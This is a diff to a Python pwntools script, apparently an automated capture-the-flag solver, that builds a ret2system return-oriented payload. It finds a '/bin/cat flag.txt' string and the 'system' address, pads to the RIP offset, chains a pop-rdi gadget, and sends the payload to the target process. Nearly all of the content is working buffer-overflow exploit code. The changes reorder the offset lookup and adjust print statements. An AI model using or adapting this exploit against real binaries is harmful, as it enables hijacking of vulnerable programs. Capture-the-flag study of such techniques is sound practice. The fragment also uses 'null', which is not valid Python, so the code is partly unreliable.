@@ -2,6 +2,7 @@ from pwn import *
 import detection
 import re
 
+
 # context.log_level = 'ERROR'
 # logging.disable(logging.CRITICAL)
 
@@ -22,8 +23,6 @@ def exploit(binary: str):
 
     payload = b''
 
-    offset = detection.find_rip_offset(binary)
-    print("[+] Offset:", offset)
     system = null
     pop_rdi = null
 
@@ -44,22 +43,27 @@ def exploit(binary: str):
         pass
     try:
         cat = next(e.search(b'/bin/cat flag.txt'))
-        print(f"[+]Location of bin/cat flag.txt: {hex(cat)}")
+        print(f"[+] Location of bin/cat flag.txt: {hex(cat)} {cat}")
     except:
-        print('[!] bin/cat flag not found')
+        print('[!] Bin/cat flag not found')
         pass
     try:
         system = e.sym['system']
         print(f"[+] System Address: {hex(system)}")
     except KeyError:
-        print('[!] system not found in a ret2system lol')
+        print('[!] System not found in a ret2system lol')
+
+    offset = detection.find_rip_offset(binary)
+    print("[+] Offset:", offset)
 
     payload += cyclic(offset)
-    payload += p64(pop_rdi)  # pop RDI
+    payload += p64(pop_rdi)
     if cat != null:
         print('bin/cat')
         payload += p64(cat)
+        #print(payload)
         payload += p64(system)
+        print(payload)
         p.sendline(payload)
 
     elif shell != null:
